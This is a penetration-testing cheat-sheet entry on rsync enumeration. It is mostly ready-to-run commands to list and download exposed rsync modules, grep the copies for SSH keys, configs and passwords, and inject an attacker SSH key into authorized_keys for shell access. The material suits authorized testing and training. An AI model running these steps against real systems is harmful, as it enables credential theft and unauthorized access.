---
id: rsync-enum
title: Rsync Enumeration
stage: enumeration
tags: [linux]
tools:
  - rsync --list-only rsync://$TARGET/
  - rsync -av rsync://$TARGET/<module>/ ./loot/
  - nmap -p873 --script rsync-list-modules $TARGET
leads_to: [ssh-access, rev-shell]
summary: List and download Rsync modules for unauthenticated file access — SSH keys and configs are prime targets.
---

## List Available Modules

```bash
rsync --list-only rsync://$TARGET/
# or
nmap -p873 --script rsync-list-modules $TARGET
```

## Download a Module

```bash
rsync -av rsync://$TARGET/<module>/ ./loot/
rsync -av --no-motd rsync://$TARGET/<module>/ ./loot/  # suppress banner
```

## Authenticated Access

```bash
rsync -av rsync://user@$TARGET/<module>/ ./loot/
# prompts for password
```

## What to Hunt

```bash
# After downloading the module, search for high-value files
find ./loot -name "id_rsa" -o -name "authorized_keys" 2>/dev/null
find ./loot -name "*.conf" -o -name ".env" -o -name "wp-config.php" 2>/dev/null
grep -r "password\|passwd\|secret\|key" ./loot/ --include="*.conf" 2>/dev/null
```

## Upload SSH Key (if write access)

If the Rsync module exposes a writable home directory:

```bash
# Generate key if needed
ssh-keygen -t rsa -f /tmp/evil_rsa -N ''

# Push authorized_keys
rsync -av /tmp/evil_rsa.pub rsync://$TARGET/<module>/.ssh/authorized_keys

# Connect
ssh -i /tmp/evil_rsa user@$TARGET
```

## Notes

- Default port 873 (TCP)
- No authentication = all exposed module content is freely readable
- Try every module — common names: `home`, `backup`, `www`, `var`, `etc`, `data`
- If a home directory is exposed → SSH key injection is the fastest path to shell
- Rsync module config lives in `/etc/rsyncd.conf` — check for `read only = false`
